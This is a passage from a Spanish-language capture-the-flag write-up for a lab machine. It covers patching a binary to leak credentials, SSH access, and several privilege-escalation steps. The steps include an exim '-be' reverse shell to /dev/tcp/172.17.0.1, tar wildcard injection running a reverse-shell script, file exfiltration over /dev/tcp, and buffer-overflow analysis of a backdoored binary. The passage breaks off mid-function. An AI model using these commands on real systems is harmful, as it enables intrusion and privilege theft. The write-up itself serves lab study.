│           0x0000314c      488d85f0fb..   lea rax, [var_410h]
│           0x00003153      4889c7         mov rdi, rax                ; const char *s
│           0x00003156      e805efffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x0000315b      4889c2         mov rdx, rax
│           0x0000315e      488d85f0fb..   lea rax, [var_410h]
│           0x00003165      4801d0         add rax, rdx
│           0x00003168      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x0000316d      488b150c31..   mov rdx, qword [obj.LAKDF]  ; [0x6280:8]=0x420e "de"
│           0x00003174      488d85f0fb..   lea rax, [var_410h]
│           0x0000317b      4889d6         mov rsi, rdx                ; const char *s2
│           0x0000317e      4889c7         mov rdi, rax                ; char *s1
│           0x00003181      e89aefffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00003186      488d85f0fb..   lea rax, [var_410h]
│           0x0000318d      4889c7         mov rdi, rax                ; const char *s
│           0x00003190      e8cbeeffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00003195      4889c2         mov rdx, rax
│           0x00003198      488d85f0fb..   lea rax, [var_410h]
│           0x0000319f      4801d0         add rax, rdx
│           0x000031a2      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x000031a7      488b15da30..   mov rdx, qword [obj.WVWVEB] ; [0x6288:8]=0x4211 "seg"
│           0x000031ae      488d85f0fb..   lea rax, [var_410h]
│           0x000031b5      4889d6         mov rsi, rdx                ; const char *s2
│           0x000031b8      4889c7         mov rdi, rax                ; char *s1
│           0x000031bb      e860efffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x000031c0      488b15c930..   mov rdx, qword [obj.RBWRTB] ; [0x6290:8]=0x4215 "uri"
│           0x000031c7      488d85f0fb..   lea rax, [var_410h]
│           0x000031ce      4889d6         mov rsi, rdx                ; const char *s2
│           0x000031d1      4889c7         mov rdi, rax                ; char *s1
│           0x000031d4      e847efffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x000031d9      488b15b830..   mov rdx, qword [obj.AEBDV]  ; [0x6298:8]=0x4219 "dad"
│           0x000031e0      488d85f0fb..   lea rax, [var_410h]
│           0x000031e7      4889d6         mov rsi, rdx                ; const char *s2
│           0x000031ea      4889c7         mov rdi, rax                ; char *s1
│           0x000031ed      e82eefffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x000031f2      488d85f0fb..   lea rax, [var_410h]
│           0x000031f9      4889c7         mov rdi, rax                ; const char *s
│           0x000031fc      e85feeffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00003201      4889c2         mov rdx, rax
│           0x00003204      488d85f0fb..   lea rax, [var_410h]
│           0x0000320b      4801d0         add rax, rdx
│           0x0000320e      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00003213      488b153630..   mov rdx, qword [obj.VNZ]    ; [0x6250:8]=0x41f8
│           0x0000321a      488d85f0fb..   lea rax, [var_410h]
│           0x00003221      4889d6         mov rsi, rdx                ; const char *s2
│           0x00003224      4889c7         mov rdi, rax                ; char *s1
│           0x00003227      e8f4eeffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x0000322c      488b152530..   mov rdx, qword [obj.HK]     ; [0x6258:8]=0x41fa str.ncor
│           0x00003233      488d85f0fb..   lea rax, [var_410h]
│           0x0000323a      4889d6         mov rsi, rdx                ; const char *s2
│           0x0000323d      4889c7         mov rdi, rax                ; char *s1
│           0x00003240      e8dbeeffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00003245      488b151430..   mov rdx, qword [obj.EEUU]   ; [0x6260:8]=0x41ff "re"
│           0x0000324c      488d85f0fb..   lea rax, [var_410h]
│           0x00003253      4889d6         mov rsi, rdx                ; const char *s2
│           0x00003256      4889c7         mov rdi, rax                ; char *s1
│           0x00003259      e8c2eeffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x0000325e      488b156330..   mov rdx, qword [obj.ASMQXZ] ; [0x62c8:8]=0x4229 ; ")B"
│           0x00003265      488d85f0fb..   lea rax, [var_410h]
│           0x0000326c      4889d6         mov rsi, rdx                ; const char *s2
│           0x0000326f      4889c7         mov rdi, rax                ; char *s1
│           0x00003272      e8a9eeffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00003277      488b153230..   mov rdx, qword [obj.POIKJ]  ; [0x62b0:8]=0x4222 ; "\"B"
│           0x0000327e      488d85f0fb..   lea rax, [var_410h]
│           0x00003285      4889d6         mov rsi, rdx                ; const char *s2
│           0x00003288      4889c7         mov rdi, rax                ; char *s1
│           0x0000328b      e890eeffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00003290      488b151130..   mov rdx, qword [obj.ERTG]   ; [0x62a8:8]=0x4220 ; " B"
│           0x00003297      488d85f0fb..   lea rax, [var_410h]
│           0x0000329e      4889d6         mov rsi, rdx                ; const char *s2
│           0x000032a1      4889c7         mov rdi, rax                ; char *s1
│           0x000032a4      e877eeffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x000032a9      b800000000     mov eax, 0
│           0x000032ae      e848f3ffff     call sym.fn2
│           0x000032b3      488d85f0ef..   lea rax, [format]
│           0x000032ba      4889c7         mov rdi, rax                ; const char *format
│           0x000032bd      b800000000     mov eax, 0
│           0x000032c2      e869edffff     call sym.imp.printf         ; int printf(const char *format)
│           0x000032c7      488d8510ef..   lea rax, [var_10f0h]
│           0x000032ce      4889c6         mov rsi, rax
│           0x000032d1      488d05550f..   lea rax, [0x0000422d]       ; "%s"
│           0x000032d8      4889c7         mov rdi, rax                ; const char *format
│           0x000032db      b800000000     mov eax, 0
│           0x000032e0      e8dbedffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x000032e5      488d8510ef..   lea rax, [var_10f0h]
│           0x000032ec      4889c7         mov rdi, rax                ; char *arg1
│           0x000032ef      e85ff5ffff     call sym.b6v4c8
│           0x000032f4      85c0           test eax, eax
│       ┌─< 0x000032f6      751b           jne 0x3313
│       │   0x000032f8      488d85f0f3..   lea rax, [s]
│       │   0x000032ff      4889c7         mov rdi, rax                ; const char *format
│       │   0x00003302      b800000000     mov eax, 0
│       │   0x00003307      e824edffff     call sym.imp.printf         ; int printf(const char *format)
│       │   0x0000330c      b801000000     mov eax, 1
│      ┌──< 0x00003311      eb6f           jmp 0x3382
│      ││   ; CODE XREF from main @ 0x32f6(x)
│      │└─> 0x00003313      488d85f0f7..   lea rax, [var_810h]
│      │    0x0000331a      4889c7         mov rdi, rax                ; const char *format
│      │    0x0000331d      b800000000     mov eax, 0
│      │    0x00003322      e809edffff     call sym.imp.printf         ; int printf(const char *format)
│      │    0x00003327      488d8580ef..   lea rax, [var_1080h]
│      │    0x0000332e      4889c6         mov rsi, rax
│      │    0x00003331      488d05f50e..   lea rax, [0x0000422d]       ; "%s"
│      │    0x00003338      4889c7         mov rdi, rax                ; const char *format
│      │    0x0000333b      b800000000     mov eax, 0
│      │    0x00003340      e87bedffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│      │    0x00003345      488d8580ef..   lea rax, [var_1080h]
│      │    0x0000334c      4889c7         mov rdi, rax                ; char *arg1
│      │    0x0000334f      e88af5ffff     call sym.x1w5z9
│      │    0x00003354      85c0           test eax, eax
│      │┌─< 0x00003356      751b           jne 0x3373
│      ││   0x00003358      488d85f0fb..   lea rax, [var_410h]
│      ││   0x0000335f      4889c7         mov rdi, rax                ; const char *format
│      ││   0x00003362      b800000000     mov eax, 0
│      ││   0x00003367      e8c4ecffff     call sym.imp.printf         ; int printf(const char *format)
│      ││   0x0000336c      b801000000     mov eax, 1
│     ┌───< 0x00003371      eb0f           jmp 0x3382
│     │││   ; CODE XREF from main @ 0x3356(x)
│     ││└─> 0x00003373      b800000000     mov eax, 0
│     ││    0x00003378      e8ecf5ffff     call sym.k8j4h3
│     ││    0x0000337d      b800000000     mov eax, 0
│     ││    ; CODE XREFS from main @ 0x3311(x), 0x3371(x)
│     └└──> 0x00003382      488b55f8       mov rdx, qword [canary]
│           0x00003386      64482b1425..   sub rdx, qword fs:[0x28]
│       ┌─< 0x0000338f      7405           je 0x3396
│       │   0x00003391      e81aedffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
│       │   ; CODE XREF from main @ 0x338f(x)
│       └─> 0x00003396      c9             leave
└           0x00003397      c3             ret
```

Obtenemos la direccion de memoria de la funcion: **k8j4h3()**
```bash
[0x00002ccf]> is~k8j4h3
59  0x00002969 0x00002969 GLOBAL FUNC   870      k8j4h3
```

Ahora tenemos la direcion de memoria:Ahora tenemosi que calcular la distancia de la funcion **Call** la que realiza la llamada:
```bash
[0x00002ccf]> pd 1 @ 0x000032c2
│           0x000032c2      e869edffff     call sym.imp.printf         ; int printf(const char *format)
```
### Credenciales Encontradas
Ahora ejecutamos el programa:
```bash
[0x00002ccf]> is~k8j4h3
59  0x00002969 0x00002969 GLOBAL FUNC   870      k8j4h3
[0x00002ccf]> pd 1 @ 0x000032c2
│           0x000032c2      e869edffff     call sym.imp.printf         ; int printf(const char *format)
[0x00002ccf]> s 0x000032c2
[0x000032c2]> wx e8a2f6ffff
[0x000032c2]> pd 1 @ 0x000032c2
│           0x000032c2      e8a2f6ffff     call sym.k8j4h3
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora que hemos sobreescrito la funcion y lo ejecutamos obtenemos lo siguiente:

### Ejecucion del Ataque
```bash
# Comandos para explotación
edenciales almacenadas:

carlos:deephack009
pedro:fasterloopPoc
```

### Intrusion
```bash
# Reverse shell o acceso inicial
ssh-keygen -R 172.17.0.2 && ssh carlos@172.17.0.2 # ( deephack009 )
```

---

## Escalada de Privilegios

###### Usuario `[ Carlos ]`:
Este usuraio tiene correos en texto plano que al leer el archivo: **mbox**
```bash
From robert@cybersec Thu Mar 20 15:35:07 2025
Return-path: <robert@cybersec>
Envelope-to: carlos@cybersec
Delivery-date: Thu, 20 Mar 2025 15:35:07 +0000
Received: from robert by cybersec with local (Exim 4.96)
        (envelope-from <robert@cybersec>)
        id 1tvHvH-00002O-1M
        for carlos@cybersec;
        Thu, 20 Mar 2025 15:35:07 +0000
To: carlos@cybersec
Subject: Viaje
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1tvHvH-00002O-1M@cybersec>
From: robert@cybersec
Date: Thu, 20 Mar 2025 15:35:07 +0000
Status: RO

Hola Carlos, espero te encuentres bien, te comento que tengo que ir de viaje con el coordinador a un evento en otra ciudad, el problema 
es que no me dara tiempo de esperar tu reporte del incidente reciente y enviar todo el informe al departamento de Dracor S.A.; en vista de que no estare 
hablare con el administrador para que te asigne permisos y asi puedas enviar el reporte desde mi correo a Dracor S.A. ya que esperan por mi 
respuesta en cuanto al caso caso y asi cuando lo tengas listo lo envias por favor.


From carlos@cybersec Thu Mar 20 15:37:51 2025
Return-path: <carlos@cybersec>
Envelope-to: robert@cybersec
Delivery-date: Thu, 20 Mar 2025 15:37:51 +0000
Received: from carlos by cybersec with local (Exim 4.96)
        (envelope-from <carlos@cybersec>)
        id 1tvHxv-00002X-0U
        for robert@cybersec;
        Thu, 20 Mar 2025 15:37:51 +0000
To: robert@cybersec
Subject: Viaje
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1tvHxv-00002X-0U@cybersec>
From: carlos@cybersec
Date: Thu, 20 Mar 2025 15:37:51 +0000
Status: RO

Hola Robert, perfecto, el reporte estara listo para manana, habla con el administrador y cualquier novedad me avisas, saludos.

From robert@cybersec Thu Mar 20 15:42:23 2025
Return-path: <robert@cybersec>
Envelope-to: carlos@cybersec
Delivery-date: Thu, 20 Mar 2025 15:42:23 +0000
Received: from robert by cybersec with local (Exim 4.96)
        (envelope-from <robert@cybersec>)
        id 1tvI2J-00002o-0k
        for carlos@cybersec;
        Thu, 20 Mar 2025 15:42:23 +0000
To: carlos@cybersec
Subject: Viaje
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1tvI2J-00002o-0k@cybersec>
From: robert@cybersec
Date: Thu, 20 Mar 2025 15:42:23 +0000
Status: RO

Saludos Carlos, ya he notificado al administrador (root) y queda a la espera de que le hagas llegar el requerimiento en root@cybersec, recuerda el formato de solicitud:

Nombre del solicitante:
Fecha:
mensaje:
Breve descripcion:

en la descripcion es importante que coloques el siguiente numero de caso para dar continuidad con mi solicitud, caso nro: 000-01458
y esta al pendiente de tu bandeja porque una vez te habiliten los permisos recibiras la notificacion, saludos
```

Nos indica que tenemos que enviar un correo con la siguiente estructura: Ejecutamos este comando
```bash
echo "Nombre del solicitante: carlos; Fecha:21/05/25; mensaje:Solicitud de Permisos; Breve descripcion:000-01458" | /usr/sbin/exim root@cybersec
```

Ahora leyendo el mensaje ya podemos enviarlos como **roberto**
```bash
carlos@cybersec:~$ mail
Mail version 8.1.2 01/15/2001.  Type ? for help.
"/var/mail/carlos": 1 message 1 new
>N  1 root@cybersec      Sat Jun 21 00:14   20/690   exim
& 1
Message 1:
From root@cybersec Sat Jun 21 00:14:53 2025
Envelope-to: carlos@cybersec
Delivery-date: Sat, 21 Jun 2025 00:14:53 +0000
To: carlos@cybersec
Subject: exim
MIME-Version: 1.0
Content-Type: text/plain; charset="ANSI_X3.4-1968"
Content-Transfer-Encoding: 8bit
From: root <root@cybersec>
Date: Sat, 21 Jun 2025 00:14:53 +0000

Hola Carlos, ya puedes enviar correos como Robert. Estos permisos se revocarM-CM-!n periM-CM-3dicamente y tendrM-CM-!s que volver a solicitarlos.
```

Listamos los permisos de usuario:
```bash
carlos@cybersec:~$ sudo -l
Matching Defaults entries for carlos on cybersec:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User carlos may run the following commands on cybersec:
    (robert) NOPASSWD: /usr/sbin/exim
```

Nos ponemos en escucha:
```bash
nc -nlp 444
```

Ahora nos aprovechamos de esto para ganar acceso como este usaurio:
```bash
# Comando para escalar al usuario: ( robert )
sudo -u robert /usr/sbin/exim -be '${run{/bin/bash -c "setsid bash -i >& /dev/tcp/172.17.0.1/444 0>&1"}}'
```

###### Usuario `[ Robert ]`:
Listando los procesos del sistema:
```bash
ps -faux
```

Tenemos lo siguiente:
```bash
ps -faux

USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   2580  1340 ?        Ss   Jun20   0:00 /bin/sh -c /root/conf.sh &     tail -f /dev/null
root           7  0.0  0.0   3928  2940 ?        S    Jun20   0:00 /bin/bash /root/conf.sh
root          25  0.0  0.2  38676 31604 ?        Ss   Jun20   0:00  \_ python3 /root/cybersec/app.py
root          30  5.1  0.3 8407024 45568 ?       Sl   Jun20  10:32  |   \_ /usr/bin/python3 /root/cybersec/app.py
root      662670  0.0  0.0   2488  1240 ?        S    00:34   0:00  \_ sleep 15
root           8  0.0  0.0   2520  1308 ?        S    Jun20   0:00 tail -f /dev/null
root          17  0.0  0.0  15440  4656 ?        Ss   Jun20   0:01 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
root      662273  0.0  0.0  17608 11340 ?        Ss   00:10   0:00  \_ sshd: carlos [priv]
carlos    662283  0.0  0.0  17868  6800 ?        S    00:10   0:00      \_ sshd: carlos@pts/0
carlos    662284  0.0  0.0   4192  3364 pts/0    Ss+  00:10   0:00          \_ -bash
root          24  0.0  0.0   3604  1956 ?        Ss   Jun20   0:00 /usr/sbin/cron
robert    662427  0.0  0.0   4196  3424 ?        Ss   00:19   0:00 bash -i
robert    662429  0.0  0.0   2520  1604 ?        S    00:19   0:00  \_ script /dev/null -c bash
robert    662430  0.0  0.0   2580  1540 pts/2    Ss   00:19   0:00      \_ sh -c bash
robert    662431  0.0  0.0   4196  3284 pts/2    S    00:19   0:00          \_ bash
robert    662671  0.0  0.0   9320  4880 pts/2    R+   00:34   0:00              \_ ps -faux
```

Vemos que **cron** esta corriendo como **root**:
```bash
root          24  0.0  0.0   3604  1812 ?        Ss   17:51   0:00 /usr/sbin/cron
```

Vemos el contenido del archivo **crontab**
```bash
robert@cybersec:/$ cat /etc/crontab 

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#
*/2 * * * * pedro /bin/bash /usr/local/bin/back.sh
```

Ahora si miramos el contenido en la siguiente ruta:
```bash
*/2 * * * * pedro /bin/bash /usr/local/bin/back.sh
```

Contenido:
```bash
cat /usr/local/bin/back.sh

#!/bin/bash
cd /home/share && tar -czf /home/pedro/back.tar *
```

Vemos que esta creando un una **backup** en la siguiente ruta: **/home/share** y Ahora crearemos el siguieente script en la misma ruta:
Nos ponemso primero en escucha:
```bash
nc -nlvp 444
```

**script.sh**
```bash
cat > script.sh << 'EOF'
#!/bin/bash

bash -c "bash -i >& /dev/tcp/172.17.0.1/444 0>&1"
EOF
```

Ahora ejeuctamos el siguiente comando:
```bash
chmod 0777 script.sh && touch -- "--checkpoint=1" "--checkpoint-action=exec=sh script.sh"
```

Ahora solo esperamos la conexion:
###### Usuario `[ Pedro ]`:
Como este usuario tenemnos este archivo: **mbox** que si lo leermos tenemos lo siguiente:
```bash
pedro@cybersec:~$ cat mbox 
From admin2@cybersec Wed Mar 19 23:02:17 2025
Return-path: <admin2@cybersec>
Envelope-to: pedro@cybersec
Delivery-date: Wed, 19 Mar 2025 23:02:17 +0000
Received: from admin2 by cybersec with local (Exim 4.96)
        (envelope-from <admin2@cybersec>)
        id E1tv2QT-00004Y-04
        for pedro@cybersec;
        Wed, 19 Mar 2025 23:02:17 +0000
To: pedro@cybersec
Subject: debugging & reverse engineering
MIME-Version: 1.0
Content-Type: text/plain; charset="ANSI_X3.4-1968"
Content-Transfer-Encoding: 8bit
Message-Id: <E1tv2QT-00004Y-04@cybersec>
From: admin2 <admin2@cybersec>
Date: Wed, 19 Mar 2025 23:02:17 +0000
Status: RO

Pedro, hemos detectado una posible puerta trasera en el binario que he dejado en tu directorio 
(Este binario fue desarrollado por el antiguo equipo de desarrollo en Dracor S.A. para llevar un registro de entrada/salida de los trabajadores), necesitamos 
que lo analisis y realices un reporte lo mas pronto posible. Quedo atento a tus comentarios, saludos.


From pedro@cybersec Wed Mar 20 00:45:47 2025
Return-path: <pedro@cybersec>
Envelope-to: admin2@cybersec
Delivery-date: Wed, 20 Mar 2025 00:45:47 +0000
Received: from pedro by cybersec with local (Exim 4.96)
        (envelope-from <pedro@cybersec>)
        id 1tv2bb-00005C-0v
        for root@cybersec;
        Wed, 20 Mar 2025 00:45:47 +0000
To: admin2@cybersec
Subject: debugging & reverse engineering
MIME-Version: 1.0
Content-Type: text/plain; charset="ANSI_X3.4-1968"
Content-Transfer-Encoding: 8bit
Message-Id: <E1tv2bb-00005C-0v@cybersec>
From: pedro@cybersec
Date: Wed, 20 Mar 2025 00:45:47 +0000
Status: RO

Buenas tardes, le adelanto los datos mas relevantes del analisis hasta la fecha.
El binario en efecto cuenta con una puerta trasera la cual es activada a traves de una funcion que nunca se llama en la ejecucion normal del programa, tambien se detecto
un buffer over flow el cual debe ser el detonante para acceder a la puerta trasera, sin embargo hasta la fecha me encuentro un poco limitado sin posibilidades de poder
continuar con un analisis mas profundo debido a que no es posible depurar el binario (sin privilegios) y tampoco es posible la ejecucion del mismo en una MV. El binario
realiza una comprobacion de su entorno de ejecucion, si detecta una MV no se ejecuta, lo mismo sucede si intento depurarlo, detecta que se intenta depurar y no se ejecuta
Si fuera posible, necesito poder depurar el binario ejecutando el depurador con privilegios y forzar la depuracion. Quedo a la espera de comentarios, saludos


From admin2@cybersec Wed Mar 20 10:02:17 2025
Return-path: <admin2t@cybersec>
Envelope-to: pedro@cybersec
Delivery-date: Wed, 20 Mar 2025 10:02:17 +0000
Received: from admin2 by cybersec with local (Exim 4.96)
        (envelope-from <admin2@cybersec>)
        id E1tv2QT-12404Y-04
        for pedro@cybersec;
        Wed, 20 Mar 2025 10:02:17 +0000
To: pedro@cybersec
Subject: debugging & reverse engineering
MIME-Version: 1.0
Content-Type: text/plain; charset="ANSI_X3.4-1968"
Content-Transfer-Encoding: 8bit
Message-Id: <E1tv2QT-12404Y-04@cybersec>
From: admin2 <admin2@cybersec>
Date: Wed, 20 Mar 2025 10:02:17 +0000
Status: RO

Hola Pedro, estuve leyendo tu correo y tengo otra pregunta para ti, crees sea posible puedas desarrollar una POC para el binario?
ya que esto seria una prueba contundente contra el antiguo equipo de desarrollo de Dracor S.A.
En cuanto a darte privilegios para que puedas depurar el binario ya que no es posible ejecutarlo en MV ni depurarlo sin provilegios,
voy a estar notificando al administrador (root) para que configure el entorno para que esto lo llevemos de la manera mas segura posible, 
espera nuevas actualizaciones de mi parte, pronto te estare escribiendo...


From admin2@cybersec Wed Mar 20 14:02:17 2025
Return-path: <admin2@cybersec>
Envelope-to: pedro@cybersec
Delivery-date: Wed, 20 Mar 2025 14:02:17 +0000
Received: from admin2 by cybersec with local (Exim 4.96)
        (envelope-from <admin2@cybersec>)
        id E1tv2QT-12404z-04
        for pedro@cybersec;
        Wed, 20 Mar 2025 14:02:17 +0000
To: pedro@cybersec
Subject: debugging & reverse engineering
MIME-Version: 1.0
Content-Type: text/plain; charset="ANSI_X3.4-1968"
Content-Transfer-Encoding: 8bit
Message-Id: <E1tv2QT-12404z-04@cybersec>
From: admin2 <admin2@cybersec>
Date: Wed, 20 Mar 2025 14:02:17 +0000
Status: RO

Saludos Pedro, como te comente, iba a notificar al administrador para configurar el entorno y asi poder darte los privilegios que solicitaste y ya se encuentra todo
listo, cuando requieras los privilegios sobre gdb se lo haces saber al administrador en root@cybersec, como es de costumbre, antes de habilitar esto debes enviar el
formato de solicitud:

Nombre del solicitante:
Fecha:
mensaje:
Breve descripcion:

Nota: en la descripcion debes colocar el numero de caso: 000-0923
```

Esto nos indica que existe un binario vulnerable a **bufferOverFlow**, Que cuenta con una puerta trasera y para poder acceder a ese binario ya que necesita privilegios elevados tenemos que enviar un correo a: **root@cybersec**
```bash
echo "Nombre del solicitante: pedro; Fecha:21/06/25; mensaje:Solicitud de Permisos; Breve descripcion:000-0923" | /usr/sbin/exim root@cybersec
```

Ahora si listamos los permisos del usuario tenemos lo siguiente:
```bash
sudo -l
Matching Defaults entries for pedro on cybersec:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User pedro may run the following commands on cybersec:
    (root) NOPASSWD: /usr/local/bin/secure_gdb
```

Ya podemos ejecutar el binario que es vulnerable a **bufferOverFlow**
```bash
cat /usr/local/bin/secure_gdb

#!/bin/bash
# script que le otorga permisos al usuario pedro para que ejecute unica y exclusivamente el binario en su directorio
bin_path="/home/pedro/hallx"
hash="183480399567de77e64a64c571bcfe7ccc0c5f67830300ac8f9b6fa6990bfc26"

if [[ $# -ne 1 ]]; then
    echo "Error: Only one argument is allowed (the path to the binary >> $bin_path)."
    exit 1
fi

if [[ "$1" != $bin_path ]]; then
    echo "Permission denied: You can only debug the binary $bin_path"
    exit 1
fi

validator=$(sha256sum "$1" |awk '{print $1}')

if [[ "$hash" != "$validator" ]]; then
   echo "Modified binary, aborting execution"
   echo "Notifying System Administrator of Event!"
   echo "Binary modification detected $bin_path" >> /root/Events.log
   sleep 2
   echo "Notification Sent"
   exit 1
fi

/usr/bin/gdb -nx -x /root/.gdbinit "$@"
```

Ahora podemos ejeuctar el banario como **root**, Pero primero nos pasamos el bianrio a nuestra maquina local de la siguiente manera: En nuesta maquina atacante ejecutamos el siguiente comando:
```bash
nc -nlvp 4444 > hallx
```

Ahora desde la maquina victima ejecutamos el siguiente comando:
```bash
cd ~ ; cat hallx > /dev/tcp/172.17.0.1/4444
```

```bash
chmod +x hallx
```

Si revisamos el tipo de archivo que tenemos ahora en nuestra maquina atacante:
```bash
file hallx
hallx: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=893e31da9cc52e4975333bd5ce87b856ef749f22, for GNU/Linux 3.2.0, not stripped
```

Tenemos un binario ejecutable que ya sabemos que es vulneraable a **bufferoverFlow**
Lazamos **Ghidra** para analizarlo y filtramos por la funcion **main**:
```bash
/* WARNING: Removing unreachable block (ram,0x001037d7) */
/* WARNING: Removing unreachable block (ram,0x00103842) */
/* WARNING: Removing unreachable block (ram,0x00103822) */
/* WARNING: Removing unreachable block (ram,0x0010384a) */

undefined8 main(void)

{
  long lVar1;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  check_virtualization();
  checkDebugger();
  create_log_directory();
  create_file_if_not_exists("/tmp/logs/events.log");
  create_file_if_not_exists("/tmp/logs/registers.log");
  puts("Sistema de Registro Entrada/Salida.");
  factor2();
  putchar(10);
  if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
```

Para resolver este problema usamos la documentacion del usaurio [Shinki](https://shinki-organization.gitbook.io/dw/write-ups/quickstart/maquinas-medio/stackinferno-write-up): 
Lo primero que hace el programa es asignar la variable `lVar1 = *(long *)(in_FS_OFFSET + 0x28)`, esto lo que hace es guardar en una variable el valor de `in_FS_OFFSET + 0x28`, lo cual es una dirección dentro del segmento `FS` donde se guarda el **stack canary**.

**¿Qué es el stack canary?**
El stack canary es básicamente una protección contra la vulnerabilidad de buffer overflow, básicamente es un dato que se genera de manera aleatoria con cada ejecución del programa. Esto permite guardar su valor en una variable local cada vez que se ejecuta una función, lo que quiere decir que se guarda en la pila(stack), lo que nos permite verificar si se ha explotado un buffer overflow.
Al final de la función `main()` vemos este código que verifica que el valor de la variable local `lVar1`, donde se guardo el canary, tenga el mismo valor que el canary dentro del segmento `FS`. En caso de que tengan un valor diferente significará que se ha explotado un buffer overflow, y por lo tanto se ejecutará la función `__stack_chk_fail()`, lo que parará la ejecución del programa. Así que tendremos que tener en cuenta esto a la hora de crear un exploit del programa.
```bash
}
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
```

Ahora, si investigamos las diferentes funciones veremos que existe una función llamada `factor1`, la cual se encargar de ejecutar una **/bin/bash**.
```bash
void factor1(void)

{
  long in_FS_OFFSET;
  char *local_30;
  char *local_28;
  undefined8 local_20;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_28 = "/usr/bin/bash";
  local_20 = 0;
  local_30 = (char *)0x0;
  execve("/usr/bin/bash",&local_28,&local_30);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Sin embargo, está función nunca es llamada en la ejecución del programa, por lo que nuestro objetivo será redirigir la ejecución del programa a la función `factor1()` y así poder obtener una shell como usuario `root`.
Ahora en la documentacion vemos que esta ejecutando otra funcion **factor2**
```c
void factor2(void)

{
  int iVar1;
  long in_FS_OFFSET;
  char local_62 [10];
  char local_58 [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Introduce tu nombre: ");
  fgets(local_58,0x80,stdin);
  iVar1 = strcmp(local_58,"carlos\n");
  if (iVar1 != 0) {
    iVar1 = strcmp(local_58,"pedro\n");
    if (iVar1 != 0) {
      puts("Usuario no autorizado, notificacion enviada al administrador. ");
      log_event(local_58,"Intento de acceso no autorizado");
      goto LAB_00103748;
    }
  }
  printf(&DAT_001046a0);
  __isoc99_scanf(&DAT_001046d7,local_62);
  iVar1 = strcmp(local_62,"entrada");
  if (iVar1 != 0) {
    iVar1 = strcmp(local_62,"salida");
    if (iVar1 != 0) {
      puts("Accion no valida.");
      goto LAB_00103748;
    }
  }
  log_register(local_58,local_62);
  printf("Registro de %s exitoso.\n",local_62);
LAB_00103748:
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Lo importante de está función es que al pedir el nombre se está permitiendo explotar la vulnerabilidad de `buffer overflow`. Esto sucede porqué la variable `local_58` se declara con 72 bytes, sin embargo, al recoger lo que ha introducido el usuario se recogen 128 bytes (`0x80`). Esto nos va a permitir sobrescribir la pila y por lo tanto la dirección de retorno (ret), así que podremos apuntar a la función `factor1()` y así obtendríamos una shell con privilegios elevados.
```c
void factor2(void)

{
  int iVar1;
  long in_FS_OFFSET;
  char local_62 [10];
  char local_58 [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Introduce tu nombre: ");
  fgets(local_58,0x80,stdin);
